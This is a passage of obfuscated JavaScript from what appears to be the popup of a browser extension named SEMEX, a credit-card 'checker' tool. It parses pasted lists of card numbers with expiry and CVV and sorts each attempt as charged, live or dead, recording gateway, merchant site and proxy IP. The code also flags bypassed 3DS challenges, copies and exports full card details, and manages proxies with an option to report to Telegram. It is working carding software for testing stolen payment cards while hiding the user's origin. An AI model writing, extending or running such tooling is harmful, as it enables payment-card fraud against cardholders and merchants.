          if (_0x462666.length <= 2 && parseInt(_0x462666, 10) >= 1 && parseInt(_0x462666, 10) <= 12) {
            const _0x401b5f = new Date().getFullYear();
            const _0x4c4dcb = new Date().getMonth() + 1;
            let _0x15ccc4;
            if (_0x2fb4e1.length === 4) {
              _0x15ccc4 = parseInt(_0x2fb4e1, 10);
            } else if (_0x2fb4e1.length === 2) {
              const _0x4b72d0 = Math.floor(_0x401b5f / 100) * 100;
              _0x15ccc4 = _0x4b72d0 + parseInt(_0x2fb4e1, 10);
              if (_0x15ccc4 < _0x401b5f - 10) {
                _0x15ccc4 += 100;
              }
            } else {
              continue;
            }
            const _0x4f4306 = _0x15ccc4 < _0x401b5f || _0x15ccc4 === _0x401b5f && parseInt(_0x462666, 10) < _0x4c4dcb;
            if (!_0x4f4306) {
              const _0x1cc15e = (_0x15ccc4 % 100).toString().padStart(2, "0");
              let _0x1e4310 = _0x47cc29 + "|" + _0x462666.padStart(2, "0") + "|" + _0x1cc15e;
              if (_0x46106c.length >= 4 && _0x46106c[3]) {
                const _0x2da48c = _0x46106c[3].replace(/\D/g, "");
                if (_0x2da48c.length >= 3 && _0x2da48c.length <= 4) {
                  _0x1e4310 += "|" + _0x2da48c;
                }
              }
              _0x1b15a2.push(_0x1e4310);
            }
          }
        }
      }
    } else {
      const _0x567787 = _0x58d49b.replace(/\D/g, "");
      if (_0x567787.length >= 13 && _0x567787.length <= 19) {
        _0x1b15a2.push(_0x567787);
      }
    }
  }
  return _0x1b15a2.join("\n");
}
__name(cleanCCListOnPaste, "cleanCCListOnPaste");
function showHistoryToast(_0x1dfb3e, _0x21b6e7 = 2000) {
  const _0x40f76c = document.querySelector(".history-toast");
  if (_0x40f76c) {
    _0x40f76c.remove();
  }
  const _0x3bc4f3 = document.createElement("div");
  _0x3bc4f3.className = "history-toast";
  _0x3bc4f3.textContent = _0x1dfb3e;
  _0x3bc4f3.style.cssText = "\n        position: fixed;\n        bottom: 80px;\n        left: 50%;\n        transform: translateX(-50%);\n        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);\n        color: white;\n        padding: 10px 20px;\n        border-radius: 8px;\n        font-size: 12px;\n        font-weight: 600;\n        z-index: 9999;\n        animation: toastFade 0.3s ease;\n        box-shadow: 0 4px 15px rgba(0,0,0,0.3);\n    ";
  document.body.appendChild(_0x3bc4f3);
  setTimeout(() => _0x3bc4f3.remove(), _0x21b6e7);
}
__name(showHistoryToast, "showHistoryToast");
let historyBlurred = true;
let historyFilter = "all";
function setupHistoryTab() {
  const _0x42b2c3 = document.getElementById("historyBlurToggle");
  if (_0x42b2c3) {
    _0x42b2c3.addEventListener("click", toggleHistoryBlur);
  }
  const _0x571877 = document.getElementById("historyFilterContainer");
  if (_0x571877) {
    _0x571877.addEventListener("click", _0xf1958b => {
      if (_0xf1958b.target.classList.contains("filter-btn")) {
        historyFilter = _0xf1958b.target.dataset.filter;
        document.querySelectorAll("#historyFilterContainer .filter-btn").forEach(_0x40599d => _0x40599d.classList.remove("active"));
        _0xf1958b.target.classList.add("active");
        loadHistory();
      }
    });
  }
  const _0x181d9c = document.getElementById("historyExportBtn");
  if (_0x181d9c) {
    _0x181d9c.addEventListener("click", exportHistory);
  }
  const _0x398726 = document.getElementById("historyCopyBtn");
  if (_0x398726) {
    _0x398726.addEventListener("click", copyHistory);
  }
  const _0x3c5368 = document.getElementById("historyClearBtn");
  if (_0x3c5368) {
    _0x3c5368.addEventListener("click", clearHistory);
  }
  document.querySelectorAll(".tab").forEach(_0x446138 => {
    _0x446138.addEventListener("click", () => {
      if (_0x446138.dataset.tab === "history") {
        loadHistory();
      }
    });
  });
}
__name(setupHistoryTab, "setupHistoryTab");
function toggleHistoryBlur() {
  const _0x30d1d7 = document.getElementById("historyList");
  const _0x21a33b = document.getElementById("historyBlurToggle");
  const _0x43505f = document.getElementById("historyBlurIcon");
  const _0xa5f358 = document.getElementById("historyBlurText");
  historyBlurred = !historyBlurred;
  if (historyBlurred) {
    _0x30d1d7.classList.add("blurred");
    _0x21a33b.classList.add("active");
    _0x43505f.textContent = "👁️";
    _0xa5f358.textContent = "Unblur";
  } else {
    _0x30d1d7.classList.remove("blurred");
    _0x21a33b.classList.remove("active");
    _0x43505f.textContent = "👁️‍🗨️";
    _0xa5f358.textContent = "Blur";
  }
}
__name(toggleHistoryBlur, "toggleHistoryBlur");
const SEMEX_HISTORY_TTL_MS = 24 * 60 * 60 * 1000; // DEAD/LIVE expire after 24h; CHARGED kept forever
function _semexIsCharged(s) {
  const v = String(s || "").toLowerCase().replace(/^ccn_/, "");
  return v === "charged" || v === "success" || v === "approved";
}
function _semexPruneHistoryList(list) {
  const now = Date.now();
  return (list || []).filter((tx) => {
    if (_semexIsCharged(tx && tx.status)) return true;
    if (tx && tx.expiresAt) return now < tx.expiresAt;
    if (tx && tx.timestamp) return now < tx.timestamp + SEMEX_HISTORY_TTL_MS;
    return true;
  });
}
async function loadHistory() {
  const _0xe5fb6b = await chrome.storage.local.get(["__xtxh"]);
  // v2.9.4: read the REAL key — this read "transactionHistory" (a legacy key
  // nothing writes anymore), so history always rendered "No transactions yet".
  const _raw = _0xe5fb6b.__xtxh || [];
  const _0x570ad9 = _semexPruneHistoryList(_raw);
  // Persist the pruned list so expired DEAD/LIVE rows are permanently removed.
  if (_0x570ad9.length !== _raw.length) {
    try { await chrome.storage.local.set({ __xtxh: _0x570ad9 }); } catch (e) {}
  }
  // Filter matcher — normalises CCN_LIVE ↔ "live" and any charged variant.
  const _historyFilterMatch = (tx) => {
    if (historyFilter === "all") return true;
    const s = String(tx.status || "").toLowerCase().replace(/^ccn_/, "");
    if (historyFilter === "charged") return s === "charged" || s === "success" || s === "approved";
    if (historyFilter === "live")    return s === "live" || s === "3d_live";
    if (historyFilter === "dead")    return s === "dead" || s === "declined" || s === "decline";
    return s === historyFilter;
  };
  const _0x3ab544 = _0x570ad9.filter(_historyFilterMatch);
  renderHistory(_0x3ab544);
}
__name(loadHistory, "loadHistory");
function renderHistory(_0x5cb4d1) {
  const _0x158377 = document.getElementById("historyList");
  if (!_0x158377) {
    return;
  }
  if (_0x5cb4d1.length === 0) {
    _0x158377.innerHTML = "\n            <div class=\"empty-state\">\n                <div class=\"empty-icon\">—</div>\n                <div>No transactions yet</div>\n            </div>\n        ";
    return;
  }
  const _escapeHTML = (s) => s == null ? "" : String(s).replace(/[&<>"']/g, (c) => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
  // Build the copy string in the format: PAN|MM|YYYY|CVV (4-digit year)
  const _buildCopyStr = (raw) => {
    const parts = String(raw || "").split("|");
    const pan = (parts[0] || "").replace(/\s+/g, "");
    if (!pan) return raw || "";
    const mm = (parts[1] || "").padStart(2, "0");
    const yrRaw = String(parts[2] || "");
    const yyyy = yrRaw.length <= 2 ? "20" + yrRaw.padStart(2, "0") : yrRaw;
    const cvv = parts[3] || "";
    return [pan, mm, yyyy, cvv].filter(Boolean).join("|");
  };
  const _fmtCard = (raw) => {
    // Input: "4111111111111234|12|28|123" or "4111111111111234"
    const parts = String(raw || "").split("|");
    const pan = (parts[0] || "").replace(/\s+/g, "");
    if (!pan || pan.length < 4) return { pretty: raw || "N/A", masked: raw || "N/A", bin: "", last4: "", exp: "", cvv: "" };
    const first4 = pan.slice(0, 4);
    const bin6 = pan.slice(0, 6);
    const last4 = pan.slice(-4);
    const midMask = "•".repeat(Math.max(pan.length - 8, 4));
    const masked = `${first4} ${midMask} ${last4}`;
    // group PAN into 4s for readability
    const grouped = pan.replace(/(.{4})/g, "$1 ").trim();
    const mm = (parts[1] || "").padStart(2, "0");
    const yy = (parts[2] || "").slice(-2);
    const exp = mm && yy ? `${mm}/${yy}` : "";
    const cvv = parts[3] || "";
    return { pretty: grouped, masked, bin: bin6, last4, exp, cvv, raw: pan };
  };
  _0x158377.innerHTML = _0x5cb4d1.map((tx, idx) => {
    const status = String(tx.status || "").toLowerCase();
    const timeFmt = new Date(tx.timestamp).toLocaleString();
    const cardStr = String(tx.card || "");
    const c = _fmtCard(cardStr);
    const brand = (window.semexDetectBrand && c.raw) ? window.semexDetectBrand(c.raw) : "unknown";
    const brandSvg = (window.semexBrandSVG && window.semexBrandSVG[brand]) || (window.semexBrandSVG && window.semexBrandSVG.unknown) || "";
    const brandName = (window.semexBrandMeta && window.semexBrandMeta[brand] && window.semexBrandMeta[brand].short) || "";
    const amountTxt = tx.amount ? (String(tx.currency || "USD").toUpperCase() + " " + tx.amount) : "";
    const gatewayTxt = tx.gateway || "";
    const siteTxt = tx.site || tx.hostname || tx.merchant || "";
    const ipTxt = tx.ip || tx.proxy_ip || "";
    const respTxt = tx.response || tx.message || tx.decline_reason || tx.declineReason || "";
    return (
      '<div class="hit-row hit-' + status + '" data-status="' + status + '" data-idx="' + idx + '" data-testid="history-row" data-copy="' + _escapeHTML(_buildCopyStr(cardStr)) + '" title="Click to copy card">' +
        '<div class="hit-row-top">' +
          '<span class="hit-brand" title="' + _escapeHTML(brandName) + '">' + brandSvg + '</span>' +
          '<span class="hit-badge hit-badge-' + status + '">' + _escapeHTML(tx.status || '?') + '</span>' +
          (c.bin ? '<span class="hit-bin hist-sensitive" title="BIN">' + _escapeHTML(c.bin) + '</span>' : '') +
          (tx.threeDSBypassed ? '<span class="hit-chip hit-3ds-bypass" title="3DS challenge bypassed">🛡️ 3DS</span>' : '') +
          (amountTxt ? '<span class="hit-amount">' + _escapeHTML(amountTxt) + '</span>' : '') +
          '<span class="hit-time">' + _escapeHTML(timeFmt) + '</span>' +
          '<button class="hit-copy-btn" data-copy="' + _escapeHTML(cardStr) + '" title="Copy full card">⧉</button>' +
        '</div>' +
        '<div class="hit-row-body hist-sensitive">' +
          '<span class="hit-pan" data-card="' + _escapeHTML(cardStr) + '">' + _escapeHTML(c.pretty || "N/A") + '</span>' +
          (c.exp ? '<span class="hit-chip"><span class="hit-tag">EXP</span><span>' + _escapeHTML(c.exp) + '</span></span>' : '') +
          (c.cvv ? '<span class="hit-chip"><span class="hit-tag">CVV</span><span>' + _escapeHTML(c.cvv) + '</span></span>' : '') +
          (gatewayTxt ? '<span class="hit-chip"><span class="hit-tag">GATE</span><span>' + _escapeHTML(gatewayTxt) + '</span></span>' : '') +
          (tx.code ? '<span class="hit-chip"><span class="hit-tag">CODE</span><span>' + _escapeHTML(tx.code) + '</span></span>' : '') +
          (respTxt ? '<span class="hit-resp-inline">' + _escapeHTML(respTxt) + '</span>' : '') +
          (siteTxt ? '<span class="hit-chip hit-chip-dim"><span class="hit-tag">SITE</span><span class="hit-mono">' + _escapeHTML(siteTxt) + '</span></span>' : '') +
          (ipTxt ? '<span class="hit-chip hit-chip-dim"><span class="hit-tag">IP</span><span class="hit-mono">' + _escapeHTML(ipTxt) + '</span></span>' : '') +
        '</div>' +
      '</div>'
    );
  }).join("");
  if (historyBlurred) {
    _0x158377.classList.add("blurred");
  } else {
    _0x158377.classList.remove("blurred");
  }
}
__name(renderHistory, "renderHistory");

// One delegated listener for "copy full card" buttons in the history rows.
(function _semexTxCopyDelegated() {
  if (window.__semexTxCopyBound) return;
  window.__semexTxCopyBound = true;
  document.addEventListener("click", (e) => {
    // Copy button click
    const b = e.target && e.target.closest && e.target.closest(".hit-copy-btn, .tx-copy-btn");
    if (b) {
      e.preventDefault();
      const v = b.getAttribute("data-copy") || "";
      if (!v || v === "N/A") return;
      try {
        navigator.clipboard.writeText(v);
        const old = b.textContent;
        b.textContent = "✓";
        b.classList.add("copied");
        setTimeout(() => { b.textContent = old; b.classList.remove("copied"); }, 900);
      } catch (err) {}
      return;
    }
    // Click anywhere on the row itself to copy the card
    const row = e.target && e.target.closest && e.target.closest(".hit-row[data-copy]");
    if (!row) return;
    // Don't fire if they clicked a button, link, or input inside the row
    if (e.target.closest("button, a, input, select")) return;
    e.preventDefault();
    const v = row.getAttribute("data-copy") || "";
    if (!v || v === "N/A") return;
    try {
      navigator.clipboard.writeText(v);
      row.classList.add("row-copied");
      setTimeout(() => row.classList.remove("row-copied"), 700);
    } catch (err) {}
  });
})();
async function exportHistory() {
  const _0x465ffe = await chrome.storage.local.get(["__xtxh"]);
  const _0x3cd911 = _0x465ffe.transactionHistory || [];
  // Filter matcher (mirrors renderHistory).
  const _match = (tx) => {
    if (historyFilter === "all") return true;
    const s = String(tx.status || "").toLowerCase().replace(/^ccn_/, "");
    if (historyFilter === "charged") return s === "charged" || s === "success" || s === "approved";
    if (historyFilter === "live")    return s === "live" || s === "3d_live";
    if (historyFilter === "dead")    return s === "dead" || s === "declined" || s === "decline";
    return s === historyFilter;
  };
  const _0x921214 = _0x3cd911.filter(_match);
  if (_0x921214.length === 0) {
    alert("No transactions to export!");
    return;
  }
  let _0x191182 = "SEMEX Transaction History Export\n";
  _0x191182 += "Filter: " + historyFilter.toUpperCase() + "\n";
  _0x191182 += "Date: " + new Date().toLocaleString() + "\n";
  _0x191182 += "=".repeat(50) + "\n\n";
  _0x921214.forEach(_0x238429 => {
    const _0x1415c5 = new Date(_0x238429.timestamp).toLocaleString();
    _0x191182 += "[" + _0x238429.status + "] " + (_0x238429.card || "N/A") + "\n";
    _0x191182 += "Site: " + (_0x238429.site || "Unknown") + "\n";
    _0x191182 += "Code: " + (_0x238429.code || "N/A") + "\n";
    _0x191182 += "Message: " + (_0x238429.message || "N/A") + "\n";
    _0x191182 += "Time: " + _0x1415c5 + "\n";
    _0x191182 += "-".repeat(40) + "\n\n";
  });
  _0x191182 += "Total: " + _0x921214.length + " transactions\n";
  const _0xcfc6e = new Blob([_0x191182], {
    type: "text/plain"
  });
  const _0x33ec83 = URL.createObjectURL(_0xcfc6e);
  const _0x686c3a = document.createElement("a");
  _0x686c3a.href = _0x33ec83;
  _0x686c3a.download = "semex-history-" + historyFilter + "-" + Date.now() + ".txt";
  document.body.appendChild(_0x686c3a);
  _0x686c3a.click();
  document.body.removeChild(_0x686c3a);
  URL.revokeObjectURL(_0x33ec83);
}
__name(exportHistory, "exportHistory");
async function copyHistory() {
  const _0x3b6913 = await chrome.storage.local.get(["__xtxh"]);
  const _0x3cf3de = _0x3b6913.transactionHistory || [];
  const _match2 = (tx) => {
    if (historyFilter === "all") return true;
    const s = String(tx.status || "").toLowerCase().replace(/^ccn_/, "");
    if (historyFilter === "charged") return s === "charged" || s === "success" || s === "approved";
    if (historyFilter === "live")    return s === "live" || s === "3d_live";
    if (historyFilter === "dead")    return s === "dead" || s === "declined" || s === "decline";
    return s === historyFilter;
  };
  const _0x2366f1 = _0x3cf3de.filter(_match2);
  if (_0x2366f1.length === 0) {
    showHistoryToast("No transactions to copy!");
    return;
  }
  const _0x5270f3 = _0x2366f1.map(_0x55f3d3 => _0x55f3d3.card || "N/A").join("\n");
  try {
    await navigator.clipboard.writeText(_0x5270f3);
    showHistoryToast("✅ Copied " + _0x2366f1.length + " cards!");
  } catch (_0x2e2e51) {
    const _0x390b62 = document.createElement("textarea");
    _0x390b62.value = _0x5270f3;
    document.body.appendChild(_0x390b62);
    _0x390b62.select();
    document.execCommand("copy");
    document.body.removeChild(_0x390b62);
    showHistoryToast("✅ Copied " + _0x2366f1.length + " cards!");
  }
}
__name(copyHistory, "copyHistory");
async function clearHistory() {
  const _0x16de20 = await showConfirmModal("Clear History", "Are you sure you want to clear all transaction history?", "Clear");
  if (_0x16de20) {
    await chrome.storage.local.set({
      __xtxh: [],
      statistics: {
        totalCards: 0,
        charged: 0,
        ccnLive: 0,
        dead: 0
      }
    });
    loadHistory();
    updateStatsUI({
      totalCards: 0,
      charged: 0,
      ccnLive: 0,
      dead: 0
    });
    showHistoryToast("✅ History cleared!");
  }
}
__name(clearHistory, "clearHistory");
function updateStatsUI(_0xfd1e84) {
  const _0x4bad62 = _0xfd1e84 || {
    totalCards: 0,
    attempts: 0,
    charged: 0,
    ccnLive: 0,
    dead: 0
  };
  const _attempts = (typeof _0x4bad62.attempts === "number")
    ? _0x4bad62.attempts
    : ((_0x4bad62.charged || 0) + (_0x4bad62.ccnLive || 0) + (_0x4bad62.dead || 0));
  const _0x3e7f3a = {
    "total-cards": _attempts,
    "stats-charged": _0x4bad62.charged,
    "stats-ccn": _0x4bad62.ccnLive,
    "stats-dead": _0x4bad62.dead
  };
  for (const [_0x567ba, _0x42bf55] of Object.entries(_0x3e7f3a)) {
    const _0x40de07 = document.getElementById(_0x567ba);
    if (_0x40de07) {
      _0x40de07.innerText = _0x42bf55 || 0;
    }
  }
}
__name(updateStatsUI, "updateStatsUI");
document.addEventListener("DOMContentLoaded", setupHistoryTab);
function countryCodeToFlag(_0x36c9ba) {
  if (!_0x36c9ba || _0x36c9ba.length !== 2) {
    return "🌍";
  }
  const _0x5496e0 = [..._0x36c9ba.toUpperCase()].map(_0x4ae4c7 => 127397 + _0x4ae4c7.charCodeAt(0));
  return String.fromCodePoint(..._0x5496e0);
}
__name(countryCodeToFlag, "countryCodeToFlag");
function parseProxyString(_0x2b5792) {
  if (!_0x2b5792 || typeof _0x2b5792 !== "string") {
    return null;
  }
  const _0x3679a9 = _0x2b5792.trim().split(":");
  if (_0x3679a9.length < 2) {
    return null;
  }
  const _0x20d6fb = parseInt(_0x3679a9[1], 10);
  if (isNaN(_0x20d6fb) || _0x20d6fb < 1 || _0x20d6fb > 65535) {
    return null;
  }
  return {
    host: _0x3679a9[0].trim(),
    port: String(_0x20d6fb),
    username: _0x3679a9.length >= 3 ? _0x3679a9[2].trim() : "",
    password: _0x3679a9.length >= 4 ? _0x3679a9[3].trim() : ""
  };
}
__name(parseProxyString, "parseProxyString");
document.addEventListener("DOMContentLoaded", () => {
  const _0x2bd811 = document.getElementById("proxy-input");
  const _0x3ae606 = document.getElementById("proxy-type-select");
  const _0x20ef47 = document.getElementById("test-proxy-btn");
  const _0x396942 = document.getElementById("activate-proxy-btn");
  const _0x150a6d = document.getElementById("disable-proxy-btn");
  const _0x3b37de = document.getElementById("proxy-test-results");
  const _0x3b20a1 = document.getElementById("proxy-status-display");
  if (!_0x2bd811 || !_0x20ef47) {
    return;
  }
  (async () => {
    try {
      const {
        proxyState: _0x50174f
      } = await chrome.storage.local.get("proxyState");
      if ((_0x50174f == null ? undefined : _0x50174f.isActive) && _0x50174f.activeProxy) {
        window.activeProxyId = _0x50174f.activeProxyId;
        const _0x22131c = document.getElementById("proxy-status-display");
        if (_0x22131c) {
          _0x22131c.classList.remove("hidden");
          const _0xf1c9b3 = _0x50174f.activeProxy.geo || {};
          const _0x2b4dfe = document.getElementById("proxy-geo-flag");
          const _0x440c2a = document.getElementById("proxy-geo-country");
          const _0x1701ca = document.getElementById("proxy-geo-ip");
          const _0x21eaaa = document.getElementById("proxy-geo-latency");
          const _0x2fcb2f = document.getElementById("proxy-geo-city");
          if (_0x2b4dfe) {
            _0x2b4dfe.textContent = _0xf1c9b3.flag || _0xf1c9b3.country || "🌍";
          }
          if (_0x440c2a) {
            _0x440c2a.textContent = _0xf1c9b3.country || _0xf1c9b3.countryName || "Connected";
          }
          if (_0x1701ca) {
            _0x1701ca.textContent = _0x50174f.activeProxy.host + ":" + _0x50174f.activeProxy.port;
          }
          if (_0x21eaaa) {
            _0x21eaaa.textContent = _0x50174f.activeProxy.latency ? _0x50174f.activeProxy.latency + "ms" : "-";
          }
          if (_0x2fcb2f) {
            _0x2fcb2f.textContent = _0xf1c9b3.city || _0xf1c9b3.location || "-";
          }
        }
      } else {
        window.activeProxyId = null;
        const _0x23da75 = document.getElementById("proxy-geo-country");
        const _0x4d8206 = document.getElementById("proxy-geo-ip");
        if (_0x23da75) {
          _0x23da75.textContent = "Not Connected";
        }
        if (_0x4d8206) {
          _0x4d8206.textContent = "-";
        }
      }
      loadSavedProxies();
    } catch (_0x128260) {}
  })();
  _0x20ef47.addEventListener("click", async () => {
    const _0x1b8a89 = _0x2bd811.value.trim();
    if (!_0x1b8a89) {
      _0x24ddfc("error", "Please enter a proxy address");
      return;
    }
    const _0x4f0f68 = parseProxyString(_0x1b8a89);
    if (!_0x4f0f68) {
      _0x24ddfc("error", "Invalid proxy format. Use: host:port or host:port:user:pass");
      return;
    }
    _0x4f0f68.type = (_0x3ae606 == null ? undefined : _0x3ae606.value) || "http";
    _0x20ef47.disabled = true;
    _0x20ef47.textContent = "Testing...";
    _0x24ddfc("loading", "Testing proxy connection...");
    try {
      const _0x448dde = await chrome.runtime.sendMessage({
        type: "TEST_PROXY",
        proxy: _0x4f0f68,
        options: {
          waitForGeo: true,
          sendToTelegram: true
        }
      });
      if (_0x448dde.success) {
        const _0x246601 = _0x448dde.geo || {};
        const _0x3223bc = countryCodeToFlag(_0x246601.country);
        const _0x455a6a = _0x448dde.latency || 0;
        _0x24ddfc("success", "✅ Proxy Live! " + _0x455a6a + "ms\n" + _0x3223bc + " " + (_0x246601.countryName || "Unknown") + " - " + (_0x246601.city || "Unknown") + "\nIP: " + (_0x448dde.ip || _0x246601.ip || "Hidden"));
        const _0x2c93ca = __spreadProps(__spreadValues({}, _0x4f0f68), {
          geo: _0x246601,
          latency: _0x455a6a,
          ip: _0x448dde.ip || _0x246601.ip,
          testedAt: Date.now()
        });
        window.lastTestedProxy = {
          proxy: _0x2c93ca,
          result: _0x448dde
        };
        const _0x325bcf = document.getElementById("auto-save-live");
        if (_0x325bcf == null ? undefined : _0x325bcf.checked) {
          await chrome.runtime.sendMessage({
            type: "SAVE_PROXY",
            proxy: _0x2c93ca
          });
          await loadSavedProxies();
        }
      } else {
        _0x24ddfc("error", "❌ " + (_0x448dde.error || "Connection failed"));
      }
    } catch (_0x515cbf) {
      _0x24ddfc("error", "❌ Error: " + _0x515cbf.message);
    } finally {
      _0x20ef47.disabled = false;
      _0x20ef47.textContent = "Test";
    }
  });
  function _0x24ddfc(_0x3ca932, _0x6ba326) {
    if (!_0x3b37de) {
      return;
    }
    _0x3b37de.classList.remove("hidden");
    _0x3b37de.style.whiteSpace = "pre-wrap";
    const _0x2841fa = {
      success: {
        bg: "#1a4d2e",
        border: "#2e7d32"
      },
      error: {
        bg: "#4d1a1a",
        border: "#c62828"
      },
      loading: {
        bg: "#1a3d4d",
        border: "#0277bd"
      },
      info: {
        bg: "#2d3a4d",
        border: "#455a64"
      }
    };
    const _0x2fcbe0 = _0x2841fa[_0x3ca932] || _0x2841fa.info;
    _0x3b37de.style.background = _0x2fcbe0.bg;
    _0x3b37de.style.border = "1px solid " + _0x2fcbe0.border;
    _0x3b37de.textContent = _0x6ba326;
  }
  __name(_0x24ddfc, "showProxyResult");
  chrome.runtime.sendMessage({
    type: "GET_PROXY_STATUS"
  }).then(_0x4bd3e3 => {
    if ((_0x4bd3e3 == null ? undefined : _0x4bd3e3.active) && _0x4bd3e3.proxy) {
      chrome.runtime.sendMessage({
        type: "GET_SAVED_PROXIES"
      }).then(_0x3c4047 => {
        if (_0x3c4047 == null ? undefined : _0x3c4047.proxies) {
          const _0x3b7b2b = _0x3c4047.proxies.find(_0x2d97be => _0x2d97be.host === _0x4bd3e3.proxy.host && _0x2d97be.port === _0x4bd3e3.proxy.port);
          if (_0x3b7b2b) {
            window.activeProxyId = _0x3b7b2b.id;
            loadSavedProxies();
          }
        }
      });
    }
  }).catch(() => {});
  loadSavedProxies();
});
async function loadSavedProxies() {
  try {
    const _0x3ed26f = await chrome.runtime.sendMessage({
      type: "GET_SAVED_PROXIES"
    });
    if (_0x3ed26f == null ? undefined : _0x3ed26f.success) {
      renderProxyList(_0x3ed26f.proxies || []);
    }
  } catch (_0x3d99f4) {}
}
__name(loadSavedProxies, "loadSavedProxies");
function renderProxyList(_0x24ea2d) {
  const _0x565fb7 = document.getElementById("saved-proxy-list");
  if (!_0x565fb7) {
    return;
  }
  if (_0x24ea2d.length === 0) {
    _0x565fb7.innerHTML = "\n            <div style=\"text-align: center; padding: 20px; color: #666; font-size: 12px;\">\n                No saved proxies yet.<br>\n                Test a proxy to auto-save it.\n            </div>\n        ";
    return;
  }
  const _0x40ad3b = window.activeProxyId || null;
  _0x565fb7.innerHTML = _0x24ea2d.map(_0x5e3729 => {
    const _0x226697 = _0x5e3729.geo || {};
    const _0x4638ee = countryCodeToFlag(_0x226697.country);
    const _0x533dab = _0x5e3729.host.substring(0, 8) + "***:" + _0x5e3729.port;
    const _0x568c41 = _0x5e3729.latency ? _0x5e3729.latency + "ms" : "-";
    const _0x2ac440 = _0x226697.city || "Unknown";
    const _0x4c2921 = _0x5e3729.id === _0x40ad3b;
    return "\n            <div class=\"proxy-item " + (_0x4c2921 ? "active" : "") + "\" data-id=\"" + _0x5e3729.id + "\">\n                <div class=\"proxy-item-status\">\n                    <span class=\"live-dot " + (_0x4c2921 ? "active-dot" : "") + "\"></span>\n                </div>\n                <div class=\"proxy-item-info\">\n                    <div class=\"proxy-item-main\">\n                        <span class=\"proxy-flag\">" + _0x4638ee + "</span>\n                        <span class=\"proxy-address\">" + _0x533dab + "</span>\n                        " + (_0x4c2921 ? "<span class=\"active-badge\">ACTIVE</span>" : "") + "\n                    </div>\n                    <div class=\"proxy-item-meta\">\n                        " + _0x2ac440 + " · " + _0x568c41 + "\n                    </div>\n                </div>\n                <div class=\"proxy-item-actions\">\n                    <button class=\"proxy-action-btn activate-btn " + (_0x4c2921 ? "deactivate" : "") + "\" \n                            data-action=\"" + (_0x4c2921 ? "deactivate" : "activate") + "\" \n                            title=\"" + (_0x4c2921 ? "Deactivate" : "Activate") + "\">\n                        " + (_0x4c2921 ? "⏹" : "▶") + "\n                    </button>\n                    <button class=\"proxy-action-btn test-btn\" data-action=\"test\" title=\"Re-test\">🔄</button>\n                    <button class=\"proxy-action-btn delete-btn\" data-action=\"delete\" title=\"Delete\">🗑</button>\n                </div>\n            </div>\n        ";
  }).join("");
  _0x565fb7.querySelectorAll(".proxy-action-btn").forEach(_0x586b44 => {
    _0x586b44.addEventListener("click", async _0x46ec04 => {
      var _0x102e61;
      var _0x286484;
      var _0x36d70c;
      _0x46ec04.stopPropagation();
      const _0x551881 = _0x46ec04.target.closest(".proxy-item");
      const _0x1afe00 = _0x551881 == null ? undefined : _0x551881.dataset.id;
      const _0x4b0f46 = _0x46ec04.target.dataset.action;
      const _0x3c6a20 = _0x24ea2d.find(_0x10df38 => _0x10df38.id === _0x1afe00);
      if (!_0x3c6a20) {
        return;
      }
      if (_0x4b0f46 === "activate") {
        _0x586b44.disabled = true;
        _0x586b44.textContent = "⏳";
        try {
          const _0x3cfbc3 = {
            mode: ((_0x102e61 = document.getElementById("split-tunnel-mode")) == null ? undefined : _0x102e61.value) || "ALL",
            sites: (((_0x286484 = document.getElementById("split-tunnel-sites")) == null ? undefined : _0x286484.value) || "").split("\n").filter(_0x57bd75 => _0x57bd75.trim())
          };
          const _0x235c62 = await chrome.runtime.sendMessage({
            type: "ACTIVATE_PROXY",
            proxy: _0x3c6a20,
            splitSettings: _0x3cfbc3
          });
          if (_0x235c62.success) {
            window.activeProxyId = _0x3c6a20.id;
            showProxyToast("✅ Proxy activated!", "success");
            updateProxyStatusDisplay(_0x3c6a20);
          } else {
            showProxyToast("❌ " + (_0x235c62.error || "Activation failed"), "error");
          }
        } catch (_0x20a9df) {
          showProxyToast("❌ " + _0x20a9df.message, "error");
        }
        await loadSavedProxies();
      } else if (_0x4b0f46 === "deactivate") {
        _0x586b44.disabled = true;
        _0x586b44.textContent = "⏳";
        try {
          await chrome.runtime.sendMessage({
            type: "DISABLE_PROXY"
          });
          window.activeProxyId = null;
          showProxyToast("🔴 Proxy disabled", "info");
          if ((_0x36d70c = document.getElementById("proxy-status-display")) == null) {
            undefined;
          } else {
            _0x36d70c.classList.add("hidden");
          }
        } catch (_0x26c5d2) {
          showProxyToast("❌ " + _0x26c5d2.message, "error");
        }
        await loadSavedProxies();
      } else if (_0x4b0f46 === "test") {
        _0x586b44.disabled = true;
        _0x586b44.textContent = "⏳";
        try {
          const _0x2acb09 = await chrome.runtime.sendMessage({
            type: "TEST_PROXY",
            proxy: _0x3c6a20,
            options: {
              waitForGeo: true,
              sendToTelegram: false
            }
          });
          if (_0x2acb09.success) {
            showProxyToast("✅ Live! " + _0x2acb09.latency + "ms", "success");
            _0x3c6a20.geo = _0x2acb09.geo;
            _0x3c6a20.latency = _0x2acb09.latency;
            _0x3c6a20.testedAt = Date.now();
          } else {
            showProxyToast("❌ " + (_0x2acb09.error || "Dead"), "error");
          }
        } catch (_0x22a726) {
          showProxyToast("❌ " + _0x22a726.message, "error");
        }
        _0x586b44.disabled = false;
        _0x586b44.textContent = "🔄";
      } else if (_0x4b0f46 === "delete") {
        await chrome.runtime.sendMessage({
          type: "REMOVE_PROXY",
          proxyId: _0x1afe00
        });
        if (window.activeProxyId === _0x1afe00) {
          await chrome.runtime.sendMessage({
            type: "DISABLE_PROXY"
          });
          window.activeProxyId = null;
        }
        await loadSavedProxies();
      }
    });
  });
}
__name(renderProxyList, "renderProxyList");
function showProxyToast(_0x2204a2, _0x3fc5b4) {
  const _0x21be9f = document.getElementById("proxy-test-results");
  if (!_0x21be9f) {
    return;
  }
  _0x21be9f.classList.remove("hidden");
  _0x21be9f.style.whiteSpace = "pre-wrap";
  const _0x419611 = {
    success: {
      bg: "#1a4d2e",
      border: "#2e7d32"
    },
    error: {
      bg: "#4d1a1a",
      border: "#c62828"
    },
    info: {
      bg: "#2d3a4d",
      border: "#455a64"
    }
  };
  const _0x3de1ac = _0x419611[_0x3fc5b4] || _0x419611.info;
  _0x21be9f.style.background = _0x3de1ac.bg;
  _0x21be9f.style.border = "1px solid " + _0x3de1ac.border;
  _0x21be9f.textContent = _0x2204a2;
  setTimeout(() => _0x21be9f.classList.add("hidden"), 3000);
}
__name(showProxyToast, "showProxyToast");
function updateProxyStatusDisplay(_0x3d0ac3) {
  const _0x119d72 = document.getElementById("proxy-status-display");
